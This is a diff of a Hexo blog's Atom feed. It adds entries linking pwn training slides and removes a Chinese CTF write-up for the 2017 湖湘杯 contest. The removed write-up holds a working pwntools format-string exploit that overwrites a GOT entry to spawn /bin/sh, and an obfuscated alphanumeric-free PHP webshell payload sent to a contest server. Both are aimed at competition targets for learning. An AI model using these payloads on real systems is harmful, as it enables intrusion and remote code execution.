@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-07-24T15:11:37.293Z</updated>
+  <updated>2018-08-09T10:53:31.406Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,13 +21,195 @@
     <link href="http://yoursite.com/2018/07/24/ppt/"/>
     <id>http://yoursite.com/2018/07/24/ppt/</id>
     <published>2018-07-24T14:42:48.000Z</published>
-    <updated>2018-07-24T15:11:37.293Z</updated>
+    <updated>2018-08-09T10:53:31.406Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="/2018/07/24/ppt/1.jpg" alt=""><br><a id="more"></a><br>PWN基础知识<br><div class="row">    <embed src="PWN基础知识.pdf" width="100%" height="550" type="application/pdf"></div><br>CTF防护机制绕过<br><div class="row">    <embed src="CTF防护机制绕过.pdf" width="100%" height="550" type="application/pdf"></div><br>Linux内核漏洞利用<br><div class="row">    <embed src="Linux内核漏洞利用.pdf" width="100%" height="550" type="application/pdf"></div><br>堆漏洞讲解<br><div class="row">    <embed src="堆漏洞讲解.pdf" width="100%" height="550" type="application/pdf"></div><br>恶意代码分析方法<br><div class="row">    <embed src="恶意代码分析方法.pdf" width="100%" height="550" type="application/pdf"></div><br>缓冲区溢出漏洞讲解<br><div class="row">    <embed src="缓冲区溢出漏洞讲解.pdf" width="100%" height="550" type="application/pdf"></div></p>]]></content>
+    <content type="html"><![CDATA[<p><img src="/2018/07/24/ppt/1.jpg" alt=""><br><a id="more"></a></p><h1 id="PWN基础知识"><a href="#PWN基础知识" class="headerlink" title="PWN基础知识"></a>PWN基础知识</h1><ul><li><a href="CTF防护机制绕过">CTF防护机制绕过</a></li><li><a href="Linux内核漏洞利用">Linux内核漏洞利用</a></li><li><a href="PWN基础知识">PWN基础知识</a></li><li><a href="XMan-Pwn-堆">XMan-Pwn-堆</a></li><li><a href="堆漏洞讲解">堆漏洞讲解</a></li><li><a href="恶意代码分析方法">恶意代码分析方法</a></li><li><a href="缓冲区溢出漏洞讲解">缓冲区溢出漏洞讲解</a></li></ul>]]></content>
     
     <summary type="html">
     
       &lt;p&gt;&lt;img src=&quot;/2018/07/24/ppt/1.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E8%AE%B2%E8%A7%A3/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/缓冲区溢出漏洞讲解/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:25.184Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="缓冲区溢出漏洞讲解"><a href="#缓冲区溢出漏洞讲解" class="headerlink" title="缓冲区溢出漏洞讲解"></a>缓冲区溢出漏洞讲解</h2><div class="row">    <embed src="缓冲区溢出漏洞讲解.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;缓冲区溢出漏洞讲解&quot;&gt;&lt;a href=&quot;#缓冲区溢出漏洞讲解&quot; class=&quot;headerlink&quot; title=&quot;缓冲区溢出漏洞讲解&quot;&gt;&lt;/a&gt;缓冲区溢出漏洞讲解&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;缓冲区溢出漏洞讲
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/XMan-Pwn-%E5%A0%86/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/XMan-Pwn-堆/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:28.156Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="XMan-Pwn-堆"><a href="#XMan-Pwn-堆" class="headerlink" title="XMan-Pwn-堆"></a>XMan-Pwn-堆</h2><div class="row">    <embed src="XMan-Pwn-堆.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;XMan-Pwn-堆&quot;&gt;&lt;a href=&quot;#XMan-Pwn-堆&quot; class=&quot;headerlink&quot; title=&quot;XMan-Pwn-堆&quot;&gt;&lt;/a&gt;XMan-Pwn-堆&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;XMan
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/CTF%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/CTF防护机制绕过/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:30.571Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="CTF防护机制绕过"><a href="#CTF防护机制绕过" class="headerlink" title="CTF防护机制绕过"></a>CTF防护机制绕过</h2><div class="row">    <embed src="CTF防护机制绕过.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;CTF防护机制绕过&quot;&gt;&lt;a href=&quot;#CTF防护机制绕过&quot; class=&quot;headerlink&quot; title=&quot;CTF防护机制绕过&quot;&gt;&lt;/a&gt;CTF防护机制绕过&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;CTF防护机制绕
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/Linux内核漏洞利用/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:29.742Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Linux内核漏洞利用"><a href="#Linux内核漏洞利用" class="headerlink" title="Linux内核漏洞利用"></a>Linux内核漏洞利用</h2><div class="row">    <embed src="Linux内核漏洞利用.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;Linux内核漏洞利用&quot;&gt;&lt;a href=&quot;#Linux内核漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;Linux内核漏洞利用&quot;&gt;&lt;/a&gt;Linux内核漏洞利用&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/恶意代码分析方法/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:26.602Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="恶意代码分析方法"><a href="#恶意代码分析方法" class="headerlink" title="恶意代码分析方法"></a>恶意代码分析方法</h2><div class="row">    <embed src="恶意代码分析方法.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;恶意代码分析方法&quot;&gt;&lt;a href=&quot;#恶意代码分析方法&quot; class=&quot;headerlink&quot; title=&quot;恶意代码分析方法&quot;&gt;&lt;/a&gt;恶意代码分析方法&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;恶意代码分析方法.pdf
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/%E5%A0%86%E6%BC%8F%E6%B4%9E%E8%AE%B2%E8%A7%A3/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/堆漏洞讲解/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:27.262Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="堆漏洞讲解"><a href="#堆漏洞讲解" class="headerlink" title="堆漏洞讲解"></a>堆漏洞讲解</h2><div class="row">    <embed src="堆漏洞讲解.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;堆漏洞讲解&quot;&gt;&lt;a href=&quot;#堆漏洞讲解&quot; class=&quot;headerlink&quot; title=&quot;堆漏洞讲解&quot;&gt;&lt;/a&gt;堆漏洞讲解&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;堆漏洞讲解.pdf&quot; width=&quot;100%&quot; 
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>&#39;pwn培训-1&#39;</title>
+    <link href="http://yoursite.com/2018/07/24/ppt/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+    <id>http://yoursite.com/2018/07/24/ppt/PWN基础知识/</id>
+    <published>2018-07-24T14:42:48.000Z</published>
+    <updated>2018-08-09T10:53:28.888Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="PWN基础知识"><a href="#PWN基础知识" class="headerlink" title="PWN基础知识"></a>PWN基础知识</h2><div class="row">    <embed src="PWN基础知识.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;PWN基础知识&quot;&gt;&lt;a href=&quot;#PWN基础知识&quot; class=&quot;headerlink&quot; title=&quot;PWN基础知识&quot;&gt;&lt;/a&gt;PWN基础知识&lt;/h2&gt;
+
+	&lt;div class=&quot;row&quot;&gt;
+    &lt;embed src=&quot;PWN基础知识.pdf&quot; wid
+      
     
     </summary>
     
@@ -303,135 +485,6 @@
     
     
       <category term="Hexo美化" scheme="http://yoursite.com/tags/Hexo%E7%BE%8E%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>writeup for 2017湖湘杯</title>
-    <link href="http://yoursite.com/2017/11/26/wp-2017-hxb/"/>
-    <id>http://yoursite.com/2017/11/26/wp-2017-hxb/</id>
-    <published>2017-11-25T16:00:47.000Z</published>
-    <updated>2018-05-03T03:59:50.135Z</updated>
-    
-    <content type="html"><![CDATA[<p>趁着周末打了湖相杯的复赛，槽点很多，不想说话，做了<strong>3R2M1P</strong>，可能题目质量比较水，感觉大家得分都超级高，水平不济，多请原谅。</p><p><img src="/2017/11/26/wp-2017-hxb/1.jpg" alt="">  </p><h1 id="1、Re4newer"><a href="#1、Re4newer" class="headerlink" title="1、Re4newer"></a>1、Re4newer</h1><p>peid查壳，发现是upx，脱壳后拖进ida查看源码<br>主程序就是和字符串异或对比<br><a id="more"></a><br><img src="http://i4.bvimg.com/620384/69750cc1d85ab06b.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">char v[100]=&#123;0x44,0x4E,0x43,0x45,0x59,0x76,0x4A,0x13,0x51,0x7D,0x4B,0x71,0x7D,0x63,0x7D,0x54</span><br><span class="line">,0x11,0x50,0x5B,0x7D,0x51,0x4B,0x4F,0x52,0x4E,0x47,0x7D,0x70,0x70,0x70,0x67,0x67</span><br><span class="line">,0x67,0x7D,0x57,0x7D,0x52,0x63,0x51,0x71,0x7D,0x13,0x56,0x5F&#125;;</span><br><span class="line">for (i=0;i&lt;44;i++)</span><br><span class="line">printf(&quot;%c&quot;,v[i]^0x22);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag{Th1s_iS_A_v3ry_simple_RRREEE_u_pAsS_1t}</p><h1 id="2、简单的android"><a href="#2、简单的android" class="headerlink" title="2、简单的android"></a>2、简单的android</h1><p>查看源码，flag就在源码里面……  </p><p><img src="http://i4.bvimg.com/620384/97f6767af0d8638e.png" alt=""></p><p>#3、Pyc分析<br>首先用uncompyle2把pyc反编译成py文件</p><blockquote><p>python -u “+unPath+”\scripts\uncompyle2 “ + file + “&gt;” + newname  </p></blockquote><p>看到代码的一刻我是崩溃的…一共就一行超长代码，还看不懂，果断放弃直接逆向分析……执行一下程序，发现是有规律的，分组加密，4位一组，可以得到3位密文，每组加密互不相关，这样的话就可以直接爆破了。刚开始直接用4位爆破，速度感人，所以再观察一下，继续测试发现，每组是有规律的，大概是这样  </p><p><img src="http://i4.bvimg.com/620384/b98a2047da99ec24.png" alt=""></p><p>（其中把每位密文以16进制形式输出，写成xx的形式）<br>于是开始优化代码，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">key=&quot;qKeywrtuiopasdfghjklzxcvbnm1234567890-_QWERTYUIOPASDFGHJLZXCVBNM&quot;</span><br><span class="line"></span><br><span class="line">secret = open(&quot;kk.enc&quot;, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">mm=secret.read()</span><br><span class="line"></span><br><span class="line">secret.close()</span><br><span class="line"></span><br><span class="line">def de(kk,w1,w2):</span><br><span class="line"></span><br><span class="line">    s=kk</span><br><span class="line"></span><br><span class="line">    flag1 = open(&quot;key.txt&quot;, &apos;w&apos;)</span><br><span class="line"></span><br><span class="line">    flag1.write(s)</span><br><span class="line"></span><br><span class="line">    flag1.close()</span><br><span class="line"></span><br><span class="line">    os.system(&quot;python revPyc.py&quot;)</span><br><span class="line"></span><br><span class="line">    flag = open(&quot;key.enc&quot;, &apos;r&apos;)</span><br><span class="line"></span><br><span class="line">    ll = flag.read()</span><br><span class="line"></span><br><span class="line">    flag.close()</span><br><span class="line"></span><br><span class="line">    a2=binascii.b2a_hex(mm[w1])</span><br><span class="line"></span><br><span class="line">    a1=binascii.b2a_hex(ll[w1])</span><br><span class="line"></span><br><span class="line">    if (a1[w2] == a2[w2]):</span><br><span class="line"></span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">while(len(mm)&gt;0):</span><br><span class="line"></span><br><span class="line">  for i in key:</span><br><span class="line"></span><br><span class="line">     if de(i,0,1)==1:</span><br><span class="line"></span><br><span class="line">        for j in key:</span><br><span class="line"></span><br><span class="line">           ss=i+j</span><br><span class="line"></span><br><span class="line">           if (de(ss,0,0)==1)and(de(ss,1,1)==1):</span><br><span class="line"></span><br><span class="line">               for k in key:</span><br><span class="line"></span><br><span class="line">                   ss=i+j+k</span><br><span class="line"></span><br><span class="line">                   if(de(ss,1,0)==1):</span><br><span class="line"></span><br><span class="line">                       for l in key:</span><br><span class="line"></span><br><span class="line">                           ss=i+j+k+l</span><br><span class="line"></span><br><span class="line">                           if (de(ss,2,0)==1)and(de(ss,2,1)==1):</span><br><span class="line"></span><br><span class="line">                               print ss</span><br><span class="line"></span><br><span class="line">                               break</span><br><span class="line"></span><br><span class="line">  mm=mm[3:-1]</span><br></pre></td></tr></table></figure></p><p><img src="http://i2.bvimg.com/620384/c0e85db215069132.png" alt=""> </p><p>可以求出三个满足条件的flag值，均提交一次，都不可以。尝试把缀余的部分删掉，再提交，也不是，无奈之下打给主办方，主办方说Key后面的d也要删掉，这个脑洞出题人你是怎么想的，你告诉我……</p><h1 id="4、Encryptor-apk"><a href="#4、Encryptor-apk" class="headerlink" title="4、Encryptor.apk"></a>4、Encryptor.apk</h1><p>查看Android源码，发现是用key的<strong>md5</strong>值轮换对文件加密</p><p><img src="http://i2.bvimg.com/620384/c8c6cb7dd04c315f.png" alt="">  </p><p>因为apk中是从图库选择文件，所以猜测是png、img等图像格式，枚举每个图像文件头与密文异或得到的值，其中与png文件头异或得到的值dc647eb65e6711e155375218212b3964用我的MD5求解小脚本发现可以解出来，是Password,所以源文件是png格式</p><p><img src="http://i2.bvimg.com/620384/d6edbb10260d8787.png" alt="">  </p><p>于是读取密文与这个MD5轮换加密，求出原文件长这样</p><p><img src="http://i2.bvimg.com/620384/820f5c9c41e5f72c.png" alt="">  </p><p>得到flag（吐槽一下这个字迹，不查我的有道小词库还真不知道写的是啥，而且m要大写……）</p><h1 id="5、pwne"><a href="#5、pwne" class="headerlink" title="5、pwne"></a>5、pwne</h1><p>产看源码，buf指针有典型的<strong>格式化漏洞</strong>，可以leak出systerm地址，写脚本cat flag</p><p><img src="http://i2.bvimg.com/620384/86f80c4861bb3a85.png" alt="">  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&apos;./pwne&apos;)</span><br><span class="line">p=remote(&apos;118.190.77.112&apos;,10080)</span><br><span class="line">libc=ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]&quot;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">p.sendline(&apos;%p%28$p&apos;)</span><br><span class="line">p.recvuntil(&apos;WELCOME \n&apos;)</span><br><span class="line">atoi_got=0x0804A02C</span><br><span class="line">data=p.recvline()</span><br><span class="line">data=int(data[10:20],16)</span><br><span class="line">libc_base=data-libc.symbols[&apos;_IO_2_1_stderr_&apos;]</span><br><span class="line">s_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">s_l=s_addr&amp;0x0000ffff</span><br><span class="line">s_h=(s_addr&amp;0xffff0000)&gt;&gt;16</span><br><span class="line">p.recvuntil(&quot;AGE:\n\n&quot;)</span><br><span class="line">p.sendline(&quot;18&quot;)</span><br><span class="line">p.recvuntil(&quot;WANT PLAY[Y/N]&quot;)</span><br><span class="line">p.sendline(&apos;Y&apos;)</span><br><span class="line">p.recvuntil(&apos;NAME:\n\n&apos;)</span><br><span class="line">payload=p32(atoi_got)+p32(atoi_got+2)+&quot;%%%dc&quot;%(s_l-8)+&quot;%7$hn&quot;+&quot;%%%dc&quot;%(s_h-s_l)+&quot;%8$hn&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;AGE:\n\n&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到flag</p><h1 id="6、Misc-300"><a href="#6、Misc-300" class="headerlink" title="6、Misc 300"></a>6、Misc 300</h1><p>解题思路、相关代码和Flag截图：<br>刚开始队友把图片还原了出来</p><p><img src="http://i1.bvimg.com/620384/f582b417f83ec9f2.png" alt=""><br>估计是看图猜人名，百度识图，谷歌识图，未果。搜题目信息</p><blockquote><p>The black pixels of a b/w image are at  </p></blockquote><p>谷歌搜到了原题。。</p><p><img src="http://i1.bvimg.com/620384/e5854a8fb5d6c6ee.png" alt="">  </p><h1 id="7、流量分析"><a href="#7、流量分析" class="headerlink" title="7、流量分析"></a>7、流量分析</h1><p>拿到流量包，协议分级发现HTTP。</p><p><img src="http://i1.bvimg.com/620384/9b048f3d0a4a805e.png" alt="">  </p><p>http conatins flag条件搜索</p><p><img src="http://i1.bvimg.com/620384/3eb9a8526706cf47.png" alt="">  </p><p>提取flag.zip后，发现ce.txt</p><p><img src="http://i1.bvimg.com/620384/c4a7348e6b99aa34.png" alt="">  </p><p>想到RGB，转换成图片。</p><p><img src="http://i1.bvimg.com/620384/ca129bf640e11dd3.png" alt="">  </p><p>得到flag。</p><p><img src="http://i1.bvimg.com/620384/a5e3912c0d2f8f4c.png" alt="">  </p><h1 id="8-Web-200"><a href="#8-Web-200" class="headerlink" title="8.Web 200"></a>8.Web 200</h1><p>提示上传PNG，正常上传后发现返回500。然后检查URL，?op=home，使用php://filter读源码。</p><p><img src="http://i1.bvimg.com/620384/23a9f5035bcf0d42.png" alt="">  </p><p>直接读flag.php。</p><p><img src="http://i1.bvimg.com/620384/2b1912902b99b801.png" alt=""><br><img src="http://i1.bvimg.com/620384/6b5fa7f98b64dc3e.png" alt="">  </p><h1 id="9-Web150"><a href="#9-Web150" class="headerlink" title="9.Web150"></a>9.Web150</h1><p>这题上午没法做，下午修题了才做出来。<br>.index.php.swp源码泄露。</p><p><img src="http://i1.bvimg.com/620384/e5b0c930de5a21d4.png" alt="">  </p><p>mt_srand()随机数能够预测到。搭建相同环境可以推出相同的随机数。Ubuntu12上用PHP5写同样的create_password函数即可。</p><p><img src="http://i1.bvimg.com/620384/68ff2a60797987e6.png" alt="">  </p><p>直接使用PHP curl提交，防止使用Python造成字符串编码。然而有个问题，我没有处理Cookie的问题，本想接下来处理，为啥直接出flag了？<br>5.Web300<br>封锁了字母+数字，以及一定的特殊符号，但是没有ban <em>();[]$，就可以构造了。参考Webshell混淆的思路，构造出一个来。<br><a href="http://114.215.71.135:10080/?content=$" target="_blank" rel="noopener">http://114.215.71.135:10080/?content=$</a></em>=’’;$<em>[%2b$</em>]%2b%2b;$<em>=$</em>.’’;$<strong>=$<em>[%2b’’];$</em>=$</strong>;$<strong><em>=$</em>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$__</em>.=$<strong>;$_</strong>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$__</em>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong></em>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong></em>.=$<strong>;$__</strong>=’<em>‘;$__=$</em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$__</strong>.=$<strong>;$</strong>=$<em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$__=$</em>;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$<strong>=$_;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>%2b%2b;$</strong>%2b%2b;$<strong>__.=$</strong>;$<em>=$$<strong>__;$</strong></em>($<em>[</em>]);<br>菜刀用_连接就可以了。</p><ul><li>by Vicen</li></ul>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;趁着周末打了湖相杯的复赛，槽点很多，不想说话，做了&lt;strong&gt;3R2M1P&lt;/strong&gt;，可能题目质量比较水，感觉大家得分都超级高，水平不济，多请原谅。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2017/11/26/wp-2017-hxb/1.jpg&quot; alt=&quot;&quot;&gt;  &lt;/p&gt;
-&lt;h1 id=&quot;1、Re4newer&quot;&gt;&lt;a href=&quot;#1、Re4newer&quot; class=&quot;headerlink&quot; title=&quot;1、Re4newer&quot;&gt;&lt;/a&gt;1、Re4newer&lt;/h1&gt;&lt;p&gt;peid查壳，发现是upx，脱壳后拖进ida查看源码&lt;br&gt;主程序就是和字符串异或对比&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
-    
-      <category term="re" scheme="http://yoursite.com/tags/re/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>hexo插件-图片墙功能</title>
-    <link href="http://yoursite.com/2017/11/23/hexo-photo/"/>
-    <id>http://yoursite.com/2017/11/23/hexo-photo/</id>
-    <published>2017-11-23T13:52:21.000Z</published>
-    <updated>2017-11-23T15:08:12.491Z</updated>
-    
